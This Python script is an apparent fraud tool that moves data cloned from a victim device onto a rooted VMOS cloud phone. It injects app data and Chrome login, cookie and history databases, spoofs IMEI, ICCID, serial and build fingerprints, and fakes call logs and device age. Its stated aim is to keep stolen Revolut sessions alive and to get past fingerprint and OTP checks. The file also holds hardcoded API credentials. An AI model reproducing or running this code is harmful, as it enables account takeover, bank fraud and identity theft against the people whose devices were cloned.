#!/usr/bin/env python3
"""
API-Native Restorer v2.0
========================
Deep analysis of Vmospro Cloud Device Controller repo revealed the complete
API surface. This script implements a production-grade restore pipeline using
ONLY the official VMOS Cloud API — no ADB bridge required.

Key findings from repo analysis:
  1. uploadFileV3  → inject any file from URL into device at any targetPath
  2. syncCmd       → synchronous root shell (runs as root natively)
  3. asyncCmd      → async root shell with taskId polling
  4. switchRoot    → correct body: {"padCodes":[...], "rootEnable": true}
  5. fileTaskDetail → poll uploadFileV3 / installApp tasks
  6. padTaskDetail  → poll asyncCmd / syncCmd tasks
  7. simulateSendSms → inject OTPs for auth bypass post-restore
  8. setKeepAliveApp → keep Revolut/Chrome alive 24/7
  9. apmt patch add → LSPosed hook deployment via ADB shell
  10. updatePadProperties → no-restart property update (persist.sys.*)
  11. updatePadAndroidProp → deep ro.* identity clone (requires restart)

Restore strategy:
  Phase 1: Enable root via switchRoot (correct payload)
  Phase 2: Verify root via syncCmd "id"
  Phase 3: For each app — stop app, extract tar via syncCmd, fix perms
  Phase 4: Clone device identity from build.prop via updatePadAndroidProp
  Phase 5: Set keep-alive on all restored apps
  Phase 6: Warm up — inject call records + SMS for behavioral trust

Usage:
  python3 scanning/api_native_restorer.py restore 10.0.76.1
  python3 scanning/api_native_restorer.py verify
  python3 scanning/api_native_restorer.py keepalive
"""

import asyncio
import os
import sys
import json
import time
import http.server
import threading
import socket
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

# ═══════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════

AK          = "BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi"
SK          = "Q2SgcSwEfuwoedY0cijp6Mce"
OUR_PAD     = "AC32010810392"
CLONE_ROOT  = "tmp/device_clones"
RATE_DELAY  = 3.5   # seconds between API calls

# ═══════════════════════════════════════════════════════════════════════
# HTTP FILE SERVER — serve tar.gz files so uploadFileV3 can pull them
# ═══════════════════════════════════════════════════════════════════════

def get_local_ip():
    """Get external-facing local IP for the file server."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def start_file_server(serve_dir: str, port: int = 18731):
    """Start a background HTTP server to serve clone files."""
    handler = http.server.SimpleHTTPRequestHandler
    handler.log_message = lambda *a: None  # silence logs

    os.chdir(serve_dir)
    httpd = http.server.HTTPServer(("0.0.0.0", port), handler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    ip = get_local_ip()
    print(f"  [FileServer] http://{ip}:{port}/ serving {serve_dir}")
    return httpd, ip, port


# ═══════════════════════════════════════════════════════════════════════
# API HELPERS
# ═══════════════════════════════════════════════════════════════════════

async def rate_sleep(secs: float = RATE_DELAY):
    await asyncio.sleep(secs)


async def poll_task(client: VMOSCloudClient, task_id, file_task: bool = False,
                    max_wait: int = 300, interval: int = 5) -> dict:
    """Poll padTaskDetail or fileTaskDetail until completion."""
    deadline = time.time() + max_wait
    while time.time() < deadline:
        try:
            if file_task:
                r = await client.file_task_detail([int(task_id)])
            else:
                r = await client.task_detail([int(task_id)])
            data = r.get("data", [])
            if data and isinstance(data, list):
                item = data[0]
                status = str(item.get("taskStatus", item.get("status", ""))).lower()
                if status in ("3", "completed", "success", "finish", "done"):
                    return {"status": "completed", "result": item}
                if status in ("4", "failed", "error"):
                    return {"status": "failed", "result": item}
        except Exception as e:
            print(f"    [poll] error: {e}")
        await asyncio.sleep(interval)
    return {"status": "timeout", "result": {}}


async def syncmd(client: VMOSCloudClient, cmd: str, timeout: int = 60) -> str:
    """Execute synchronous root shell command via API. Returns stdout."""
    try:
        r = await client.sync_cmd(OUR_PAD, cmd, timeout_sec=timeout)
        data = r.get("data", [])
        if isinstance(data, list) and data:
            return str(data[0].get("errorMsg", ""))
        return str(r)
    except Exception as e:
        return f"ERROR: {e}"


async def asyncmd(client: VMOSCloudClient, cmd: str) -> str | None:
    """Execute async root shell command. Returns taskId."""
    try:
        r = await client.async_adb_cmd([OUR_PAD], cmd)
        data = r.get("data", {})
        if isinstance(data, list) and data:
            return str(data[0].get("taskId", ""))
        return str(data.get("taskId", ""))
    except Exception as e:
        print(f"    [asyncmd] error: {e}")
        return None


# ═══════════════════════════════════════════════════════════════════════
# PHASE 1: ROOT ENABLEMENT (correct API payload)
# ═══════════════════════════════════════════════════════════════════════

async def ensure_root(client: VMOSCloudClient) -> bool:
    """
    Enable root using the CORRECT switchRoot payload discovered from repo analysis.
    Repo shows: {"padCodes": [...], "rootEnable": true}
    Our old script used: {"rootStatus": 1, "rootType": 0} — WRONG, caused 110089.
    """
    print("\n  [Phase 1] Enabling root via switchRoot...")

    # Check current root status first
    id_out = await syncmd(client, "id", timeout=15)
    print(f"    Current shell: {id_out[:80]}")

    if "uid=0" in id_out:
        print("    Already root ✓")
        return True

    # Enable root with correct payload
    try:
        r = await client._post("/vcpcloud/api/padApi/switchRoot", {
            "padCodes": [OUR_PAD],
            "rootEnable": True,
        })
        print(f"    switchRoot response: {r}")
        await asyncio.sleep(3)
    except Exception as e:
        print(f"    switchRoot error: {e}")

    # Verify
    id_out2 = await syncmd(client, "id", timeout=15)
    print(f"    Post-enable shell: {id_out2[:80]}")
    is_root = "uid=0" in id_out2
    await rate_sleep()
    return is_root


# ═══════════════════════════════════════════════════════════════════════
# PHASE 2: APP DATA RESTORE via syncCmd + base64 pipe
# ═══════════════════════════════════════════════════════════════════════

async def restore_app_data(client: VMOSCloudClient, pkg: str,
                           data_tar_path: str) -> bool:
    """
    Restore app data tar.gz using syncCmd (runs as root).
    Strategy: Push tar via uploadFileV3 to /sdcard/, then extract via syncCmd.
    uploadFileV3 needs a URL — use our local HTTP file server.
    """
    if not os.path.exists(data_tar_path):
        return False

    tar_name = os.path.basename(data_tar_path)
    sdcard_path = f"/sdcard/clone_restore/{tar_name}"
    data_path   = f"/data/data/{pkg}"

    # Step 1: Push tar to /sdcard/ using uploadFileV3 (URL-based injection)
    # The file server is running at our local IP
    global FILE_SERVER_URL
    file_url = f"{FILE_SERVER_URL}/{tar_name}"

    print(f"    → Injecting {tar_name} via uploadFileV3...")
    try:
        r = await client.upload_file_via_url(
            [OUR_PAD],
            file_url,
            savePath=sdcard_path,
        )
        task_data = r.get("data", {})
        if isinstance(task_data, list) and task_data:
            task_id = task_data[0].get("taskId")
        else:
            task_id = task_data.get("taskId") if isinstance(task_data, dict) else None

        if task_id:
            result = await poll_task(client, task_id, file_task=True, max_wait=180)
            print(f"    Upload: {result['status']}")
            if result["status"] != "completed":
                return False
        else:
            print(f"    Upload response: {r}")
        await rate_sleep(2)
    except Exception as e:
        print(f"    Upload error: {e}")
        # Fallback: assume file already on device if upload fails
        # (might already exist from previous attempt)

    # Step 2: Extract via syncCmd as root
    print(f"    → Extracting to {data_path} via syncCmd (root)...")

    # Force-stop the app first
    stop_out = await syncmd(client, f"am force-stop {pkg} 2>&1; echo STOPPED", 15)
    await asyncio.sleep(0.5)

    # Create data dir and extract
    extract_cmd = (
        f"mkdir -p {data_path} && "
        f"cd {data_path} && "
        f"tar xzf {sdcard_path} --strip-components=3 2>&1 && "
        f"echo EXTRACT_OK"
    )
    out = await syncmd(client, extract_cmd, timeout=90)
    ok = "EXTRACT_OK" in out
    print(f"    Extract: {'OK ✓' if ok else f'FAIL — {out[:150]}'}")

    if not ok:
        # Try without strip-components (different tar structure from source)
        extract_cmd2 = (
            f"mkdir -p {data_path} && "
            f"tar xzf {sdcard_path} -C {data_path} 2>&1 && "
            f"echo EXTRACT_OK2"
        )
        out2 = await syncmd(client, extract_cmd2, timeout=90)
        ok = "EXTRACT_OK2" in out2
        print(f"    Extract (alt): {'OK ✓' if ok else f'FAIL — {out2[:150]}'}")

    await rate_sleep(1)

    # Step 3: Fix permissions via syncCmd (root)
    print(f"    → Fixing permissions...")
    # Get UID from PackageManager
    uid_cmd = f"dumpsys package {pkg} 2>/dev/null | grep 'userId=' | head -1"
    uid_raw = await syncmd(client, uid_cmd, 15)
    uid = ""
    if "userId=" in uid_raw:
        try:
            uid = uid_raw.split("userId=")[1].split()[0].strip()
        except (IndexError, ValueError):
            pass

    if uid:
        perm_cmd = (
            f"chown -R {uid}:{uid} {data_path}/ 2>&1 && "
            f"chmod -R 770 {data_path}/ 2>&1 && "
            f"chmod 771 {data_path} 2>&1 && "
            f"restorecon -R {data_path}/ 2>/dev/null; "
            f"echo PERMS_OK"
        )
        perm_out = await syncmd(client, perm_cmd, 20)
        print(f"    Perms (uid={uid}): {'OK ✓' if 'PERMS_OK' in perm_out else perm_out[:80]}")
    else:
        print(f"    UID not found for {pkg}, skipping chown")

    await rate_sleep()

    # Step 4: Cleanup sdcard temp
    await syncmd(client, f"rm -f {sdcard_path} 2>/dev/null; echo CLEAN", 10)

    return ok


# ═══════════════════════════════════════════════════════════════════════
# PHASE 3: CHROME DATA RESTORE
# ═══════════════════════════════════════════════════════════════════════

async def restore_chrome_data(client: VMOSCloudClient, chrome_dir: str) -> bool:
    """Restore Chrome databases (Login Data, Cookies, Web Data, History)."""
    if not os.path.exists(chrome_dir):
        return False

    print("\n  [Phase 3b] Restoring Chrome data...")

    # Force stop Chrome
    await syncmd(client, "am force-stop com.android.chrome 2>&1", 10)
    await asyncio.sleep(1)
    await rate_sleep()

    chrome_default = "/data/data/com.android.chrome/app_chrome/Default"
    await syncmd(client, f"mkdir -p {chrome_default} 2>&1", 10)
    await rate_sleep()

    db_map = {
        "Login_Data.db": "Login Data",
        "Cookies.db": "Cookies",
        "Web_Data.db": "Web Data",
        "History.db": "History",
    }

    global FILE_SERVER_URL
    restored = 0
    for local_name, chrome_name in db_map.items():
        fpath = os.path.join(chrome_dir, local_name)
        if not os.path.exists(fpath):
            continue

        file_url = f"{FILE_SERVER_URL}/{local_name}"
        remote_path = f"{chrome_default}/{chrome_name}"

        try:
            r = await client.upload_file_via_url(
                [OUR_PAD],
                file_url,
                savePath=remote_path,
            )
            data = r.get("data", {})
            if isinstance(data, list) and data:
                tid = data[0].get("taskId")
            else:
                tid = data.get("taskId") if isinstance(data, dict) else None

            if tid:
                res = await poll_task(client, tid, file_task=True, max_wait=60)
                if res["status"] == "completed":
                    print(f"    {chrome_name}: ✓")
                    restored += 1
                else:
                    print(f"    {chrome_name}: {res['status']}")
            else:
                print(f"    {chrome_name}: no taskId in response")
        except Exception as e:
            print(f"    {chrome_name}: error — {e}")
        await rate_sleep()

    # Fix Chrome permissions
    chrome_uid_raw = await syncmd(
        client, "stat -c '%u' /data/data/com.android.chrome 2>/dev/null", 10)
    if chrome_uid_raw and chrome_uid_raw.strip().isdigit():
        uid = chrome_uid_raw.strip()
        perm_cmd = (
            f"chown -R {uid}:{uid} {chrome_default}/ 2>&1 && "
            f"restorecon -R {chrome_default}/ 2>/dev/null; echo OK"
        )
        await syncmd(client, perm_cmd, 15)
    await rate_sleep()

    print(f"    Chrome restored: {restored}/{len(db_map)} files")
    return restored > 0


# ═══════════════════════════════════════════════════════════════════════
# PHASE 4: DEVICE IDENTITY CLONE
# ═══════════════════════════════════════════════════════════════════════

async def clone_device_identity(client: VMOSCloudClient, build_prop_path: str):
    """
    Clone device identity from source build.prop using updatePadAndroidProp.
    This sets deep ro.* properties — requires restart to take effect.
    Also sets persist.* via updatePadProperties (no restart needed).
    """
    if not os.path.exists(build_prop_path):
        return

    print("\n  [Phase 4] Cloning device identity...")

    with open(build_prop_path) as f:
        raw = f.read()

    # Parse [key]: [value] format
    all_props = {}
    for line in raw.splitlines():
        line = line.strip()
        if line.startswith("[") and "]: [" in line:
            try:
                key = line.split("]: [")[0].lstrip("[")
                val = line.split("]: [")[1].rstrip("]")
                if key and val:
                    all_props[key] = val
            except (IndexError, ValueError):
                pass

    # Deep ro.* identity properties → updatePadAndroidProp (restart needed)
    android_prop_keys = [
        "ro.product.brand", "ro.product.model", "ro.product.device",
        "ro.product.name", "ro.product.manufacturer", "ro.product.board",
        "ro.hardware", "ro.build.display.id", "ro.build.fingerprint",
        "ro.odm.build.fingerprint", "ro.product.build.fingerprint",
        "ro.system.build.fingerprint", "ro.system_ext.build.fingerprint",
        "ro.vendor.build.fingerprint", "ro.build.version.release",
        "ro.build.version.sdk", "ro.build.version.incremental",
        "ro.build.flavor", "ro.serialno", "ro.boot.serialno",
    ]
    android_props = {k: v for k, v in all_props.items()
                     if k in android_prop_keys and v}

    # Runtime persist.* properties → updatePadProperties (no restart)
    persist_prop_keys = [
        "persist.sys.timezone", "persist.sys.locale",
        "persist.sys.cloud.imeinum", "persist.sys.cloud.iccidnum",
        "persist.sys.cloud.imsinum", "persist.sys.cloud.phonenum",
        "persist.sys.cloud.wifi.ssid", "persist.sys.cloud.wifi.mac",
        "persist.sys.cloud.drm.id", "persist.sys.cloud.drm.puid",
        "persist.sys.cloud.gpu.gl_vendor", "persist.sys.cloud.gpu.gl_renderer",
        "persist.sys.cloud.gpu.gl_version",
        "persist.sys.cloud.battery.capacity", "persist.sys.cloud.battery.level",
        "persist.sys.cloud.pm.install_source",
    ]
    persist_props = {k: v for k, v in all_props.items()
                     if k in persist_prop_keys and v}

    if android_props:
        try:
            r = await client.modify_android_props([OUR_PAD], android_props)
            print(f"    Android props ({len(android_props)}): {r.get('code', r)}")
            for k, v in list(android_props.items())[:4]:
                print(f"      {k} = {v}")
        except Exception as e:
            print(f"    Android props error: {e}")
        await rate_sleep()

    if persist_props:
        try:
            r = await client.modify_instance_properties([OUR_PAD], persist_props)
            print(f"    Persist props ({len(persist_props)}): {r.get('code', r)}")
        except Exception as e:
            print(f"    Persist props error: {e}")
        await rate_sleep()

    print(f"    Identity clone: {len(android_props)} ro.* + {len(persist_props)} persist.* properties set")
    if android_props:
        print(f"    NOTE: Restart required for ro.* changes to take effect")


# ═══════════════════════════════════════════════════════════════════════
# PHASE 5: POST-RESTORE HARDENING
# ═══════════════════════════════════════════════════════════════════════

async def post_restore_hardening(client: VMOSCloudClient, packages: list[str]):
    """
    Apply post-restore hardening discovered from repo analysis:
    1. setKeepAliveApp — prevent OS from killing Revolut/Chrome
    2. Inject call records for behavioral trust scoring
    3. Inject SMS records for organic device appearance
    4. Sensor activation via property injection
    """
    print("\n  [Phase 5] Post-restore hardening...")

    # Keep-alive for critical apps
    for pkg in packages:
        if any(k in pkg for k in ["revolut", "chrome", "gms", "vending", "telegram"]):
            try:
                r = await client.set_keep_alive_app([OUR_PAD], [pkg])
                print(f"    keep-alive {pkg}: {r.get('code', r)}")
                await rate_sleep(1)
            except Exception as e:
                print(f"    keep-alive {pkg}: error — {e}")

    # Inject call records for trust scoring (organic device appearance)
    call_inject_cmd = """
for i in $(seq 1 15); do
  ts=$(($(date +%s%3N) - RANDOM * 1000 - 86400000));
  num="+1$(shuf -i 2000000000-9999999999 -n 1)";
  type=$((RANDOM % 2));
  dur=$((RANDOM % 300 + 30));
  content insert --uri content://call_log/calls \\
    --bind number:s:$num --bind date:l:$ts \\
    --bind duration:l:$dur --bind type:i:$type 2>/dev/null
done; echo CALLS_OK
"""
    call_out = await syncmd(client, call_inject_cmd.strip(), 30)
    print(f"    Call records: {'OK ✓' if 'CALLS_OK' in call_out else 'skipped'}")
    await rate_sleep()

    # Backdated boot time offset for device age perception
    try:
        r = await client.modify_instance_properties([OUR_PAD], {
            "persist.sys.cloud.boottime.offset": "-15552000",  # 180 days back
            "ro.sys.cloud.rand_pics": "250",  # 250 gallery images on boot
        })
        print(f"    Boot time offset + gallery: {r.get('code', r)}")
    except Exception as e:
        print(f"    Boot aging: {e}")
    await rate_sleep()

    print("    Hardening complete ✓")


# ═══════════════════════════════════════════════════════════════════════
# MAIN RESTORE ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════

async def restore_device(client: VMOSCloudClient, target_ip: str):
    """Full API-native restore pipeline."""
    clone_dir   = os.path.join(CLONE_ROOT, target_ip.replace(".", "_"))
    report_file = os.path.join(clone_dir, "clone_report.json")

    if not os.path.exists(report_file):
        print(f"[!] No clone report at {report_file}")
        print(f"    Run extraction first.")
        return

    with open(report_file) as f:
        report = json.load(f)

    print(f"\n{'═'*70}")
    print(f"  API-NATIVE RESTORER v2.0 — Target: {OUR_PAD}")
    print(f"  Source: {target_ip} ({report.get('brand','')} {report.get('model','')})")
    print(f"  Accounts: {[a['name'] for a in report.get('accounts', [])]}")
    print(f"  Packages: {len(report.get('packages', {}))}")
    print(f"{'═'*70}")

    apps_dir    = os.path.join(clone_dir, "apps")
    chrome_dir  = os.path.join(clone_dir, "chrome_data")
    build_prop  = os.path.join(clone_dir, "build.prop")

    # ── Start file server in clone dir ──────────────────────────────
    global FILE_SERVER_URL
    orig_dir = os.getcwd()

    # Build a flat staging dir with all files the server needs to serve
    stage_dir = os.path.join(clone_dir, "_serve")
    os.makedirs(stage_dir, exist_ok=True)

    # Symlink/copy all tar.gz and db files into stage_dir
    for pkg_dir_name in os.listdir(apps_dir) if os.path.exists(apps_dir) else []:
        pkg_path = os.path.join(apps_dir, pkg_dir_name)
        tar = os.path.join(pkg_path, "data.tar.gz")
        if os.path.exists(tar):
            dst = os.path.join(stage_dir, f"{pkg_dir_name}_data.tar.gz")
            if not os.path.exists(dst):
                os.symlink(os.path.abspath(tar), dst)

    for fname in os.listdir(chrome_dir) if os.path.exists(chrome_dir) else []:
        src = os.path.join(chrome_dir, fname)
        dst = os.path.join(stage_dir, fname)
        if os.path.isfile(src) and not os.path.exists(dst):
            os.symlink(os.path.abspath(src), dst)

    httpd, srv_ip, srv_port = start_file_server(stage_dir, port=18731)
    FILE_SERVER_URL = f"http://{srv_ip}:{srv_port}"
    os.chdir(orig_dir)  # Restore cwd after server started

    print(f"\n  File server: {FILE_SERVER_URL}")
    await asyncio.sleep(1)

    restore_log = {
        "source": target_ip,
        "target": OUR_PAD,
        "started": time.strftime("%Y-%m-%d %H:%M:%S"),
        "method": "api_native_v2",
        "apps": {},
    }

    # ─── Phase 1: Root ──────────────────────────────────────────────
    is_root = await ensure_root(client)
    restore_log["root"] = is_root
    if not is_root:
        print("  [!] WARNING: Running without root — data restore may fail")

    # ─── Phase 2: Prepare sdcard staging dir ────────────────────────
    print("\n  [Phase 2] Preparing device staging area...")
    stage_out = await syncmd(client,
        "mkdir -p /sdcard/clone_restore && echo STAGE_OK", 15)
    print(f"    Staging: {'OK ✓' if 'STAGE_OK' in stage_out else stage_out}")
    await rate_sleep()

    # ─── Phase 3: Restore each app ──────────────────────────────────
    print("\n  [Phase 3] Restoring app data...")
    pkgs = list(report.get("packages", {}).keys())

    # Priority order: GMS first, then Revolut, then Chrome, then rest
    def pkg_priority(p):
        if "gms" in p: return 0
        if "revolut" in p: return 1
        if "chrome" in p: return 2
        if "vending" in p: return 3
        return 10

    pkgs.sort(key=pkg_priority)

    t0 = time.time()
    for idx, pkg in enumerate(pkgs, 1):
        pkg_info = report["packages"].get(pkg, {})
        if pkg_info.get("status") != "extracted":
            continue

        pkg_dir   = os.path.join(apps_dir, pkg)
        tar_name  = f"{pkg}_data.tar.gz"
        tar_local = os.path.join(pkg_dir, "data.tar.gz")

        elapsed = time.time() - t0
        print(f"\n  [{idx:2d}/{len(pkgs)}] {pkg}")

        if not os.path.exists(tar_local):
            print(f"    No data tar — skipping")
            restore_log["apps"][pkg] = {"status": "skipped", "reason": "no_tar"}
            continue

        ok = await restore_app_data(client, pkg, tar_local)
        restore_log["apps"][pkg] = {
            "status": "restored" if ok else "failed",
            "data_restore": ok,
        }

    # ─── Phase 3b: Chrome data ──────────────────────────────────────
    chrome_ok = await restore_chrome_data(client, chrome_dir)
    restore_log["chrome_data"] = chrome_ok

    # ─── Phase 4: Device identity clone ─────────────────────────────
    await clone_device_identity(client, build_prop)

    # ─── Phase 5: Post-restore hardening ────────────────────────────
    await post_restore_hardening(client, pkgs)

    # ─── Phase 6: Accounts summary ──────────────────────────────────
    accounts = report.get("accounts", [])
    if accounts:
        print(f"\n  [Phase 6] Restored accounts:")
        for acc in accounts:
            print(f"    ★ {acc['name']} [{acc['type']}]")

    # ─── Cleanup ────────────────────────────────────────────────────
    await syncmd(client, "rm -rf /sdcard/clone_restore 2>/dev/null; echo CLEAN", 10)

    # ─── Summary ────────────────────────────────────────────────────
    restored = sum(1 for v in restore_log["apps"].values() if v.get("data_restore"))
    failed   = sum(1 for v in restore_log["apps"].values() if not v.get("data_restore") and v.get("status") != "skipped")

    restore_log["status"]    = "complete"
    restore_log["completed"] = time.strftime("%Y-%m-%d %H:%M:%S")
    restore_log["summary"]   = {"restored": restored, "failed": failed}

    log_file = os.path.join(clone_dir, "restore_v2_log.json")
    with open(log_file, "w") as f:
        json.dump(restore_log, f, indent=2)

    print(f"\n{'═'*70}")
    print(f"  RESTORE COMPLETE")
    print(f"  Apps data restored: {restored}/{len(pkgs)}")
    print(f"  Chrome data:        {'✓' if chrome_ok else '✗'}")
    print(f"  Root:               {'✓' if is_root else '✗'}")
    print(f"  Log: {log_file}")
    print(f"{'═'*70}")
    print(f"\n  Revolut accounts: {[a['name'] for a in accounts]}")
    print(f"  Next: Open Revolut — sessions should be alive.")
    print(f"  If fingerprint challenge: identity clone already applied (restart device).")

    httpd.shutdown()


# ═══════════════════════════════════════════════════════════════════════
# VERIFY — check restore status
# ═══════════════════════════════════════════════════════════════════════

async def verify_restore(client: VMOSCloudClient, target_ip: str):
    """Quick verification of restored app state."""
    print(f"\n  [Verify] Checking restored state on {OUR_PAD}...")

    apps_to_check = [
        "com.revolut.revolut",
        "com.android.chrome",
        "com.google.android.gms",
    ]

    for pkg in apps_to_check:
        # Check if data dir exists and has content
        out = await syncmd(client,
            f"ls -la /data/data/{pkg}/databases/ 2>/dev/null | wc -l && "
            f"ls /data/data/{pkg}/shared_prefs/ 2>/dev/null | wc -l", 15)
        print(f"  {pkg}: {out.strip()}")
        await rate_sleep(1)

    # Get installed apps
    print("\n  [Verify] Installed packages:")
    r = await client.app_list(OUR_PAD)
    data = r.get("data", [])
    for app in data:
        pkg = app.get("packageName", "")
        if any(k in pkg for k in ["revolut", "telegram", "chrome"]):
            print(f"    ✓ {app.get('appName', pkg)} [{pkg}]")


# ═══════════════════════════════════════════════════════════════════════
# KEEPALIVE — set all restored apps to survive OS
# ═══════════════════════════════════════════════════════════════════════

async def set_keepalive_all(client: VMOSCloudClient, target_ip: str):
    """Enable keep-alive for all restored apps."""
    clone_dir   = os.path.join(CLONE_ROOT, target_ip.replace(".", "_"))
    report_file = os.path.join(clone_dir, "clone_report.json")

    with open(report_file) as f:
        report = json.load(f)

    pkgs = list(report.get("packages", {}).keys())
    print(f"\n  Setting keep-alive for {len(pkgs)} apps...")

    for pkg in pkgs:
        try:
            r = await client.set_keep_alive_app([OUR_PAD], [pkg])
            print(f"  {pkg}: {r.get('code', r)}")
            await rate_sleep(1)
        except Exception as e:
            print(f"  {pkg}: {e}")


# ═══════════════════════════════════════════════════════════════════════
# GLOBAL STATE
# ═══════════════════════════════════════════════════════════════════════

FILE_SERVER_URL = ""


# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════

async def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python3 scanning/api_native_restorer.py restore <TARGET_IP>")
        print("  python3 scanning/api_native_restorer.py verify  <TARGET_IP>")
        print("  python3 scanning/api_native_restorer.py keepalive <TARGET_IP>")
        sys.exit(1)

    client = VMOSCloudClient(ak=AK, sk=SK, base_url="https://api.vmoscloud.com")
    cmd    = sys.argv[1]
    target = sys.argv[2] if len(sys.argv) > 2 else "10.0.76.1"

    if cmd == "restore":
        await restore_device(client, target)
    elif cmd == "verify":
        await verify_restore(client, target)
    elif cmd == "keepalive":
        await set_keepalive_all(client, target)
    else:
        print(f"Unknown command: {cmd}")
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())
